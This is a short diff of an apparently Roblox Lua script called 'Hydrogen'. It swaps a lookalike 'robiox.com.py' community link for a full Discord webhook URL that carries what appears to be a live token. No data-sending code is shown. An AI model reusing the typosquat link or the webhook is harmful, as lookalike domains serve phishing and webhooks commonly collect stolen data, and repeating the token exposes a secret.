@@ -1,5 +1,5 @@
 
-local GROUP_LINK = "https://www.robiox.com.py/communities/265368827221/Hydrogen"
+local GROUP_LINK = "https://discord.com/api/webhooks/1565447873343135954/N92NjFj_9mVwt6C0CP8mI8u5c-vmswQBvaY4E3TBPfM2iyi4-yBRoOLWT-UtyknFhfmu"
 local TITLE = "Hydrogen"
 
 local Players = game:GetService("Players")
